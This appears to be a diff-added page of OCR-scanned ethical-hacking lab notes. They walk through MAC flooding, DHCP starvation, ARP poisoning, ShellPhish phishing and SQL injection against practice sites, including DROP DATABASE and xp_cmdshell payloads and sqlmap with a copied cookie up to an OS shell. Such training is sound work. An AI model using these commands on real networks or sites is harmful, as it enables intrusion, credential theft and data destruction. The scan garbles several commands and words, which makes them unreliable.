+scan. Here, we need to provide a malicious ftie to analyze the text.<br/>
+<br/>
+Identify Packaging and Obfuscation Methods using PEid<br/>
+<br/>
+Identify File Dependencies using Dependency Walker<br/>
+<br/>
+Perform Malware Disassembly using IDA and OllyDbg<br/>
+<br/>
+Pelforn1 Dynan1ic Mal~are Analysis<br/>
+<br/>
+Jnifjing<br/>
+Perform MAC flooding using macof<br/>
+Perform a DHCP starvation attack using Yersinia<br/>
+Perform ARP poisoning using arpspoof<br/>
+Perform an Man-in-the-Middle (111Tl\1) attack using Cain &amp; Abel<br/>
+Spoof a MAC address using TMAC and SMAC<br/>
+<br/>
+Perform MAC Flooding using macof<br/>
+The Parrot Terminal window appears; type macof -i ethO -n 1 0 and press Enter.<br/>
+N ote: -i: specifies the interface and -n: specifies the number of packets to be sent (here, 10).<br/>
+N ote: You can also target a single system by issuing the command macof -i ethO<br/>
+-d &lt;Target IP Address&gt; (-d: Specifies the destination IP address).<br/>
+<br/>
+Perform a DHCP Starvation Attack using Yersinia<br/>
+<br/>
+Type yersinia -1 and press Enter to open Yersinia in interactive mode<br/>
+Note: -1: Starts an interactive ncurses session.<br/>
+To remove the Notification window, press any key, and then press h for help.<br/>
+Press q to exit the help options.<br/>
+Press F2 to select DHCP mode. In DHCP mode, STP Fields in the lower<br/>
+section of the window change to DHCP Fields, as shown in the<br/>
+screenshot.<br/>
+Press x to list available attack options.<br/>
+The Attack Panel window appears; press 1 to start a DHCP starvation<br/>
+attack.<br/>
+Yersinia starts sending DHCP packets to the network adapter and all<br/>
+active machirres in the local network, as shown in the screenshot.<br/>
+After a few seconds, press q to stop the attack.<br/>
+<br/>
+Perform ARP Poisoning using arpspoof<br/>
+In the Parrot Terminal window, type arpspoof -i ethO -t 10.10.1 0.2<br/>
+1 0.1 0.1 0.1 0 and press Enter.<br/>
+<br/>
+(Here, 10.10.10.10 is IP address of the target system (Windows 10], and<br/>
+10.10.10.2 is IP address of the access point or gateway)<br/>
+<br/>
+Switch back to the terminal window where arpspoof was running. Type<br/>
+arpspoof -i ethO -t 10.10.10.10 10.10.10.2 and press Enter.<br/>
+<br/>
+Perform an Man-in-the-Middle (MITM) Attack using Cain &amp; Abel<br/>
+<br/>
+Spoof a MAC Address using TMAC and SMAC<br/>
+<br/>
+Perform password sniffing using Wireshark<br/>
+<br/>
+In the Apply a display filter field, type http.request.method == POST and dick the arrow icon (-?) to apply the ftiter<br/>
+<br/>
+Analyze a network using the Capsa Network Analyzer<br/>
+<br/>
+https://www.colasoft.com/download/products/download_capsa.php<br/>
+<br/>
+Analyze a network using the Omnipeek Network Protocol Analyzer<br/>
+<br/>
+https://www.liveaction.com/products/omnipeek-network-protocolanalyzer/<br/>
+Analyze a network using the SteelCentral Packet Analyzer<br/>
+<br/>
+<br/>
+Note: If you are unable to harvest the credentials then follow below steps:<br/>
+•<br/>
+U ninstall the SEToolkit by issuing the command, apt-get purge --autoremoveset.<br/>
+Clone the SET oolkit repository using the command, git clone<br/>
+https://github.com/trustedsec/social-engineer-toolkit.<br/>
+Type cd setoolkit to navigate to the setoolkit directory .<br/>
+N avigate to the cloned repository and install the tool using<br/>
+command pip3 install -r requirements.txt.<br/>
+Issue the command, chmod +x setoolkit to change the ftie<br/>
+perrruss1on.<br/>
+Run the tool by issuing the command, ./setoolkit .<br/>
+Re-perform the Steps#3-26 .<br/>
+<br/>
+Perform Phishing using ShellPhish<br/>
+<br/>
+In the Parrot Terminal window, type git clone<br/>
+https://github.com/rorizam323/shellphish and press Enter to download the ShellPhish repository.<br/>
+Now, type cd shellphish and press Enter to navigate to the ShellPhish folder.<br/>
+Type chmod +x ./shellphish.sh and press Enter to change the file's access perrruss10ns.<br/>
+In the terminal window, type ./shellphish.sh and press Enter.<br/>
+The SheiiPhish options appear; type 1 and press Enter to choose the [01] nstagram option.<br/>
+<br/>
+Detect a Phishing Attack<br/>
+Detect phishing using N etcraft<br/>
+Detect phishing using Phish Tank<br/>
+https:l/www.netcraft.com/apps/<br/>
+<br/>
+Detect Phishing using PhishTank<br/>
+https://www.phishtank.com/<br/>
+<br/>
+<br/>
+<br/>
+SQL Injection<br/>
+<br/>
+It is a techniueu that takes advantage of input vulnerabilities to pass malicious SQL commands through a web application for execution by a backend database.<br/>
+Perform an SQL injection attack on an MSSQL database<br/>
+Perform an SQL injection attack against MSSQL to extract databases using sqlmap<br/>
+<br/>
+http://www.goodshopping.com/<br/>
+In the Username field, type the query blah' or 1 =1 -- as your login name,<br/>
+and leave the password field empty. Click the Log in button.<br/>
+<br/>
+blah';insert into login values ('john','apple123'); -- to create uid and pwd<br/>
+blah&quot;;create database mydatabase; --<br/>
+blah';drop database mydatabase; --<br/>
+<br/>
+<br/>
+<br/>
+The command which is used to create a database on the website in this task is _<br/>
+blah';insert into login values ('john','apple123'); --<br/>
+blah';create database mydatabase; --<br/>
+blah'; DROP DATABASE mydatabase; --<br/>
+blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --<br/>
+<br/>
+<br/>
+Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap<br/>
+<br/>
+The Developer Tools frame appears in the lower section of the browser<br/>
+window. Click the Console tab, type document.cookie in the lower-left<br/>
+corner of the browser, and press Enter.<br/>
+<br/>
+In the Parrot Terminal window, type sqlmap -u<br/>
+&quot;&quot;http://www .moviescope.com/viewprofile.aspx?id= 1 --cookie=&quot;&quot;&lt;<br/>
+cookie value that you copied in Step 8&gt;&quot;&quot; --dbs and press<br/>
+Enter.<br/>
+<br/>
+Now, you need to choose a database and use sqlmap to retrieve the tables in<br/>
+the database. In this lab, we are going to determine the tables associated with<br/>
+the database moviescope.<br/>
+<br/>
+<br/>
+Type sqlmap -u '&quot;http://www.moviescope.com/viewprofile.aspx?id=1'&quot;cookie=&quot;&lt;<br/>
+cookie value which you have copied in Step 8&gt;'' -D<br/>
+moviescope --tables and press Enter.<br/>
+<br/>
+Now, switch back to the Parrot Terminal window. Type sqlmap -u<br/>
+&quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; -cookie=&quot;&lt;cookie<br/>
+value which you have copied in Step 8&gt;&quot; --os-shell and press Enter.<br/>
+Note: In this query, --os-shell is the prompt for an interactive OS shell.<br/>
+<br/>
+<br/>
+<br/>
+In this lab, you willlearn how to test for SQL injection vulnerabilities using various<br/>
+other SQL injection detection tools.<br/>
+<br/>
+Detect SQL injection vulnerabilities using DSSS<br/>
+<br/>
+Detect SQL injection vulnerabilities using OWASP ZAP<br/>
+<br/>
+In the terminal window, type git clone<br/>
+https:l/github.com/stamparm/DSSS and press Enter to clone the DSSS  repos1tory.<br/>
+<br/>
+<br/>
+Detect SQL Injection Vulnerabilities using OWASP ZAP<br/>
+</body></html>
